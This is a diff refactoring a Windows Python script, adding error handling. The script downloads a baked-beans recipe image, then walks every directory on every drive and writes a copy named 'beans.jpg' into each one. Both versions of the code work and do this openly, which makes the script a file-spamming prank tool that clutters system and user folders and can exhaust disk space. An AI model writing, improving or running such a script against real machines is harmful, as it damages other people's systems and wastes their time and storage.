@@ -1,82 +1,74 @@
 import os
 import platform
-import win32api  # Requires pywin32 module
+import win32api
 import requests
 import shutil
 
-
-# Function to download a file from a given URL and save it to the Downloads folder (Windows only)
+# Function to download a file from a given URL
 def download_file(url: str):
-    if platform.system() != "Windows":  # Check if the OS is not Windows
-        print(f"{platform.system()} not supported.")
-        return
+    try:
+        # Check if the platform is Windows, as this script is designed for Windows OS
+        if platform.system() != "Windows":
+            raise Exception(f"{platform.system()} not supported.")
+        
+        # Get the path to the user's Downloads folder
+        downloads_folder = os.path.join(os.path.expanduser("~"), "Downloads")
+        
+        # Send a GET request to the specified URL and save the file
+        response = requests.get(url, stream=True)
+        response.raise_for_status()
+        file_name = url.split("/")[-1]
+        bean_path = os.path.join(downloads_folder, file_name)
 
-    # Define the path to the Downloads folder
-    downloads_folder = os.path.join(os.path.expanduser("~"), "Downloads")
-    response = requests.get(url, stream=True)
-    response.raise_for_status()
-    file_name = url.split("/")[-1]
+        # Save the downloaded file to the Downloads folder
+        with open(bean_path, "wb") as f:
+            shutil.copyfileobj(response.raw, f)
 
-    # Define the full path for the downloaded file in the Downloads folder
-    bean_path = os.path.join(downloads_folder, file_name)
+        print(f"Success! File saved to {bean_path}")
 
-    # Open the downloaded file and copy its content to the specified path
-    with open(bean_path, "wb") as f:
-        shutil.copyfileobj(response.raw, f)
+    except requests.exceptions.HTTPError as err:
+        print(f"HTTP error occurred: {err}")
+    except Exception as err:
+        print(f"An error occurred: {err}")
 
-    print(f"Success! File saved to {bean_path}")
-
-
-# Check the detected operating system and display a message
+# Check if the current platform is Windows
 if platform.system() == "Windows":
     release = platform.release()
-    if release != "":
+    if release:
         print(f"Windows {release} detected.")
     else:
         print("Windows detected, but release can't be determined.")
-elif platform.system() == "Linux":
-    release = platform.release()
-    print(f"Linux {release} not supported.")
-    quit()  # Exit the script if Linux is detected
-elif platform.system() == "Darwin":
-    release = platform.release()
-    print(f"macOS {release} not supported.")
+else:
+    # Print a message if the platform is not supported and exit the script
+    print(f"{platform.system()} not supported.")
     quit()
 
-# Get a list of available drives on Windows
+# Get a list of available drives on the system
 get_drives = win32api.GetLogicalDriveStrings()
 list_of_drives = get_drives.split("\x00")
-drive_list = []
+drive_list = [drive for drive in list_of_drives if drive]
 
-for drive in list_of_drives:
-    if drive == "":
-        pass
-    else:
-        drive_list.append(drive)
-
-# Download the file using the download_file() function
-download_file(
-    "https://sweetcsdesigns.com/wp-content/uploads/2021/05/slow-cooker-baked-beans-Recipe-Picture-1.jpg"
-)
-
-# Define the URL and file paths
+# URL of the file to be downloaded
 url = "https://sweetcsdesigns.com/wp-content/uploads/2021/05/slow-cooker-baked-beans-Recipe-Picture-1.jpg"
-downloads_folder = os.path.join(os.path.expanduser("~"), "Downloads")
-response = requests.get(url, stream=True)
-response.raise_for_status()
-file_name = url.split("/")[-1]
 
-bean_path = os.path.join(downloads_folder, file_name)
+try:
+    # Download the file and save it to the Downloads folder
+    download_file(url)
+    downloads_folder = os.path.join(os.path.expanduser("~"), "Downloads")
+    file_name = url.split("/")[-1]
+    bean_path = os.path.join(downloads_folder, file_name)
 
-# Copy the downloaded file to locations on available drives where files are named "beans.jpg"
-for drive in drive_list:
-    if os.path.isdir(drive):
-        for src, dirs, files in os.walk(drive):
-            file_path = os.path.join(src, "beans.jpg")
-            try:
-                shutil.copyfile(bean_path, file_path)
-                print(f"Success! {file_path} created")
-            except:
-                pass
-    else:
-        pass
+    # Copy the downloaded file to specified locations on available drives
+    for drive in drive_list:
+        if os.path.isdir(drive):
+            for src, dirs, files in os.walk(drive):
+                file_path = os.path.join(src, "beans.jpg")
+                try:
+                    shutil.copyfile(bean_path, file_path)
+                    print(f"Success! {file_path} created")
+                except Exception as e:
+                    print(f"Error occurred while copying to {file_path}: {e}")
+        else:
+            print(f"{drive} is not a valid drive.")
+except Exception as e:
+    print(f"An error occurred: {e}")
